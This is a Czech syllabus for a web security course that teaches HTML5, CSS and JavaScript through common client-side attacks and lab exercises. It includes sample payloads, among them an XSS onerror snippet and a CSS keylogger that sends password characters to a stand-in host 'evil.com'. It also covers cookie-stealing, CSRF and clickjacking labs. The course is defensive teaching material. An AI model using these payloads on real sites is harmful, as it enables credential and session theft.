Zde je návrh intenzivního kurzu, který za cca 200 minut provede účastníky základy HTML5, CSS a JavaScriptu. Důraz je kladen na pochopení mechanik, které stojí za nejčastějšími útoky na webové aplikace – kurz nemá sloužit jako návod k páchání trestné činnosti, ale k lepší obraně.

Kurz je rozdělen do 5 bloků, na konci je praktické cvičení. Počítej s nutností vlastního pískoviště (např. lokální server, Browser Developer Tools).

---

### BLOK 1: HTML5 – Struktura a pastičky (40 min)

**1.1 Kostra dokumentu a parsing HTML (10 min)**
- Sémantika vs. div-soup
- Co prohlížeč dělá, když parsuje HTML (oprava chyb, tolerance)
- **Bezpečnostní důsledek**: Mutace XSS (mXSS) – jak se liší parsing HTML uvnitř `<svg>`, `<math>` nebo vnořených kontextech.
- Ukázka: Zdánlivě bezpečný kód, který prohlížeč interpretuje jako spustitelný.

**1.2 Formuláře a přenos dat (15 min)**
- `<form>`, atributy `action`, `method`, `enctype`
- GET vs. POST – viditelnost dat v URL, logy serveru
- **Zneužití**:
  - **Login CSRF** – útočník donutí oběť odeslat formulář s útočníkovými přihlašovacími údaji, sleduje historii/akce.
  - **Autofill harvesting** – skryté inputy (`type="hidden"` maskované jako textová pole) sbírající údaje z automatického vyplňování.
  - **HTML injection do placeholder/ value**: `<input value="<?= $_GET['q'] ?>">` bez escapování umožní XSS.

**1.3 Iframe, hyperlinky a vzorce spoléhání (10 min)**
- `<a href="..." target="_blank">`, `rel="noopener noreferrer"`
- **Tabnabbing**: stránka otevřená přes `target="_blank"` má přístup k `window.opener`, může přesměrovat původní tab.
- **Clickjacking**: `<iframe>` průhledný přes bankovní tlačítko, oběť klikne nevědomky.
- Obrana: `X-Frame-Options`, CSP `frame-ancestors`, `rel="noopener"`.

**1.4 Atributy pro události a skriptování (5 min)**
- `onclick`, `onerror`, `onload` – základ DOM XSS
- Ukázka: `<img src=x onerror=alert(1)>` – proč to funguje i v sanitizovaném HTML.

---

### BLOK 2: CSS – Vrstva stylů jako útočný vektor (35 min)

**2.1 Selektory, kaskáda a dědičnost (10 min)**
- Specifita, `!important`, inline styly
- **CSS Injection**: Když aplikace vloží neošetřený vstup do `<style>` nebo atributu `style="..."`.

**2.2 Moderní selektory a jejich zneužití (15 min)**
- Atributové selektory s wildcards: `input[value^="a"]`, `input[value$="z"]`
- **CSS Keylogger (exfiltrace dat)**:
  - Princip: Pro každý znak v hodnotě inputu se nastaví jiné pozadí (URL), při shodě prohlížeč pošle request na útočníkův server.
  - Ukázka:
    ```css
    input[type="password"][value^="a"] { background: url("https://evil.com/log?key=a"); }
    input[type="password"][value^="b"] { background: url("https://evil.com/log?key=b"); }
    ```
  - Funguje jen za určitých podmínek (value atribut se neaktualizuje s uživatelským vstupem, proto nutný trik s `contenteditable` nebo využití `-webkit-text-security` a font-face pro side-channel).

**2.3 Skrytá nebezpečí v moderním CSS (10 min)**
- `@import` – načtení externího stylu, může být použito pro obcházení CSP (pokud povoluje styly z libovolné domény).
- `url()`, `behavior` (IE), `-moz-binding` – historicky vedly k XSS.
- **CSS Exfiltrace přes fonty**: Pomocí `@font-face` a `unicode-range` lze zjistit, jaké znaky uživatel na stránce vidí (čtení obsahu).

---

### BLOK 3: JavaScript – Jádro interakce a zneužití (55 min)

**3.1 Proměnné, datové typy a scope (10 min)**
- `var` vs `let`/`const`, hoisting
- **Globální scope znečištění**: Pokud frameworky používají globální proměnné, lze je přepsat (prototype pollution).
- **`eval()` a `new Function()`** – přímé vyhodnocení řetězce jako kódu, hlavní cesta k DOM XSS.

**3.2 DOM manipulace – nebezpečné funkce (20 min)**
- `innerHTML`, `outerHTML`, `document.write()` – parsují HTML a spouštějí skripty. Ukázka:
  ```javascript
  // Nebezpečné
  div.innerHTML = uživatelský_vstup; // <img src=x onerror=...>
  ```
- **Bezpečnější alternativy**: `textContent`, `createElement`, `setAttribute` (i zde pozor na `javascript:` URI).
- `insertAdjacentHTML` – stejně nebezpečný jako `innerHTML`.
- **DOM Clobbering**: Zneužití `id` a `name` atributů k přepsání globálních proměnných a vlastností DOM.
  ```html
  <form id="config">
    <input name="debug" value="true">
  </form>
  ```
  Pak `window.config` odkazuje na form element, což může zmást bezpečnostní kontroly (např. `if (config.debug) ...`).

**3.3 Události a Event Handlery (10 min)**
- `addEventListener`, inline handlery v HTML
- **Zneužití**: `javascript:` v `href`, `onclick`, `onmouseover` atd.
- **PostMessage API**: `window.postMessage` – pokud přijímač neověřuje `origin`, lze posílat podvržené zprávy a provést XSS napříč okny.

**3.4 Ajax, fetch a CORS (15 min)**
- Základ `fetch()`, XMLHttpRequest, JSON parsing.
- **Same-Origin Policy** a jak ji obchází CORS.
- **CSRF (Cross-Site Request Forgery)**: Útočník z jiné domény donutí prohlížeč udělat request na zranitelnou aplikaci, kde je oběť přihlášená.
  - Příklad: skrytý formulář, který změní heslo.
  - Obrana: CSRF tokeny, SameSite cookies, ověření hlavičky `Origin`/`Referer`.
- **JSON Hijacking** (historické): Zachytávání JSON odpovědí přes přepsaný `Array` konstruktor, dnes blokováno, ale ilustruje riziko.

---

### BLOK 4: Webová úložiště a autentizace (25 min)

**4.1 Cookies, localStorage, sessionStorage (10 min)**
- Cookies: `HttpOnly`, `Secure`, `SameSite`, `Domain`/`Path`
- **XSS krádež cookies**: `document.cookie` – pokud chybí HttpOnly, útočník ukradne session ID.
- **Zneužití localStorage/sessionStorage**: pro XSS payload je dostupný, citlivá data (tokeny) by v něm neměla být.
- **Session Fixation**: Útočník nastaví oběti cookie se známým session ID.

**4.2 JSON Web Token (JWT) – základ a slabiny (10 min)**
- Struktura, podpis.
- **Nejčastější chyby**: `alg: none`, slabý HMAC secret, prohození algoritmu (RS256 vs HS256).
- Kde token ukládat – bezpečnostní kompromisy.

**4.3 Content Security Policy (CSP) v praxi (5 min)**
- Základní direktivy: `script-src`, `style-src`, `object-src`
- **CSP bypass**:
  - JSONP endpointy na vlastní doméně.
  - `strict-dynamic` a nedůvěryhodné knihovny.
  - Inline skripty s nonce – pokud je nonce fixní nebo uniká.

---

### BLOK 5: Praktické laboratorní cvičení “Hackni svou aplikaci” (45 min)

Účastníci ve dvojicích dostanou jednoduchou zranitelnou aplikaci (TODO list) a postupně odhalují a zneužívají chyby na straně klienta.

**Cvičení 1: Reflected XSS (10 min)**
- Aplikace vkládá parametr z URL do stránky bez escapování.
- Úkol: Vytvoř URL, která zobrazí `alert(document.domain)`.
- Následně prozkoumat, jak lze payload obfuscovat.

**Cvičení 2: Stored XSS přes komentář (10 min)**
- Pole pro komentář ukládá HTML.
- Úkol: Vložit komentář, který při zobrazení komukoli ukradne jeho cookies (simulace – pošle je na fiktivní server).
- Diskuze: dopad uloženého XSS oproti reflected.

**Cvičení 3: CSRF útok na změnu hesla (10 min)**
- Formulář změny hesla nemá CSRF token a přijímá GET parametry.
- Úkol: Vytvoř HTML stránku na lokálním “útocníkově” serveru, která po otevření přihlášenou obětí změní heslo.
- Oprava: přidání skrytého tokenu a kontrola na straně serveru.

**Cvičení 4: Clickjacking (5 min)**
- Ověřit, že DELETE tlačítko úkolu jde vložit do iframe.
- Vytvořit průhledný overlay s falešným tlačítkem “Klikni pro výhru”.

**Cvičení 5: Oprava a nasazení CSP (10 min)**
- Navrhnout a otestovat Content Security Policy, která zabrání XSS, ale zároveň nechá aplikaci fungovat.
- Ošetřit innerHTML nahrazením za bezpečné API.

---

### Doporučené pomůcky a zdroje
- PortSwigger Web Security Academy (bezplatné laboratoře)
- OWASP Cheat Sheet Series
- Browser DevTools (Network, Console, Application, Security tab)
- Lokální proxy pro sledování requestů (Burp Suite Community Edition)

Kurz je koncipován tak, aby po jeho absolvování účastníci rozuměli nejen základům tvorby webu, ale i tomu, jak se jejich kód může zneužít, a uměli základním útokům předcházet.
